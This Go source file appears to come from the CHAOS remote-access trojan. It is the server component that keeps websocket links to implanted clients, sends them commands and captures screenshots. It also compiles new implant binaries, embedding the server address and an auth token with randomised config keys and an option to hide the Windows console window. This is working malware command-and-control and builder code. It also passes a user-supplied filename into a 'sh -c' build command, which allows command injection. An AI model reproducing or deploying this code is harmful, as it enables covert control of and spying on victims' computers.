package client

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/image"
	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/random"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"net"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
)

const (
	clientBaseDir        = "client/"
	buildBaseDir         = "build/"
	configFileName       = "config.json"
	mainFileName         = "main.go"
	clientConfigFilepath = "app/utils/config.go"
	buildStr             = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -extldflags "-static"' -o ../../temp/%s main.go`
)

type clientService struct {
	AppVersion    string
	Clients       map[string]*websocket.Conn
	Mu            *sync.Mutex
	configuration *environment.Configuration
	Repository    authRepo.Repository
	AuthService   auth.Service
}

func NewClientService(
	appVersion string,
	configuration *environment.Configuration,
	repository authRepo.Repository,
	authService auth.Service,
) Service {
	return &clientService{
		AppVersion:    appVersion,
		configuration: configuration,
		Clients:       make(map[string]*websocket.Conn, 0),
		Mu:            &sync.Mutex{},
		Repository:    repository,
		AuthService:   authService,
	}
}

func (c clientService) GetConnection(clientID string) (*websocket.Conn, bool) {
	c.Mu.Lock()
	conn, found := c.Clients[clientID]
	c.Mu.Unlock()
	return conn, found
}

func (c clientService) RemoveConnection(clientID string) error {
	c.Mu.Lock()
	delete(c.Clients, clientID)
	c.Mu.Unlock()
	return nil
}

func (c clientService) AddConnection(clientID string, connection *websocket.Conn) error {
	c.Mu.Lock()
	c.Clients[clientID] = connection
	c.Mu.Unlock()
	return nil
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	client, found := c.GetConnection(input.ClientID)
	if !found {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	command := &entities.Command{
		Command:   input.Command,
		Parameter: input.Parameter,
	}

	req, err := json.Marshal(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	err = client.WriteMessage(websocket.BinaryMessage, req)
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	_, readMessage, err := client.ReadMessage()
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	var response request.RespondCommandRequestBody
	if err := json.Unmarshal(readMessage, &response); err != nil {
		return SendCommandOutput{}, err
	}

	command.Response = response.Response
	command.HasError = response.HasError

	command, err = handleResponse(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	res := utils.ByteToString(command.Response)
	if command.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: internal.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func handleResponse(payload *entities.Command) (*entities.Command, error) {
	switch payload.Command {
	case "screenshot":
		filepath, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(filepath)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	if !isValidIPAddress(input.GetServerAddress()) && !isValidURL(input.GetServerAddress()) {
		return "", internal.ErrInvalidServerAddress
	}
	if !isValidPort(input.ServerPort) {
		return "", internal.ErrInvalidServerPort
	}

	buildPath, err := c.PrepareBuildSession(input)
	if err != nil {
		return "", err
	}
	defer utils.RemoveDir(buildPath)

	filename := buildFilename(input.OSTarget, input.GetFilename())
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, filename)

	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = buildPath

	outputErr, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%w:%s", err, outputErr)
	}
	return filename, nil
}

type ClientParam struct {
	Key   string
	Value string
}

func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]ClientParam, error) {
	token, err := c.GenerateNewToken()
	if err != nil {
		return nil, err
	}

	const stringLength = 10
	const portKey = "port"
	const serverAddressKey = "server_address"
	const tokenKey = "token"

	configurationMap := make(map[string]ClientParam)

	configurationMap[portKey] = ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: input.GetServerPort(),
	}
	configurationMap[serverAddressKey] = ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: input.GetServerAddress(),
	}
	configurationMap[tokenKey] = ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: token,
	}

	return configurationMap, err
}

func isValidIPAddress(s string) bool {
	return net.ParseIP(s) != nil
}

func isValidURL(s string) bool {
	if _, err := url.ParseRequestURI(s); err != nil {
		return false
	}
	return true
}

func isValidPort(port string) bool {
	match, err := regexp.MatchString("^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", port)
	return match && err == nil
}

func (c clientService) GenerateNewToken() (string, error) {
	config, err := c.AuthService.GetAuthConfig()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
}

func (c clientService) WriteClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
	m := make(map[string]string)
	for _, config := range configuration {
		m[config.Key] = config.Value
	}

	configurationJson, err := json.Marshal(m)
	if err != nil {
		return err
	}

	encoded := utils.EncodeBase64(string(configurationJson))

	return utils.WriteFile(buildPath+sessionFilename, bytes.NewBufferString(encoded).Bytes())
}

func (c clientService) ReplaceClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
	filepath := buildPath + clientConfigFilepath
	f, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	content := string(f)
	for key, param := range configuration {
		oldParam := fmt.Sprintf(`"%s"`, key)
		newParam := fmt.Sprintf(`"%s"`, param.Key)
		content = strings.ReplaceAll(content, oldParam, newParam)
	}

	return utils.WriteFile(filepath, bytes.NewBufferString(content).Bytes())
}

func (c clientService) ReplaceMainConfigurationFile(buildPath string, sessionFilename string) error {
	filepath := buildPath + mainFileName
	f, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	content := strings.ReplaceAll(string(f), configFileName, sessionFilename)
	return utils.WriteFile(filepath, bytes.NewBufferString(content).Bytes())
}

func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string, error) {
	sessionID := uuid.New().String()
	sessionFilename := fmt.Sprintf("%s", sessionID)
	buildPath := fmt.Sprint(buildBaseDir, sessionID, "/")

	err := utils.CopyDir(clientBaseDir, buildPath)
	if err != nil {
		return "", err
	}

	clientConfiguration, err := c.BuildClientConfiguration(input)
	if err != nil {
		return "", err
	}

	err = c.WriteClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
	if err != nil {
		return "", err
	}

	err = c.ReplaceClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
	if err != nil {
		return "", err
	}

	err = c.ReplaceMainConfigurationFile(buildPath, sessionFilename)
	if err != nil {
		return "", err
	}

	return buildPath, nil
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func buildFilename(os system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch os {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
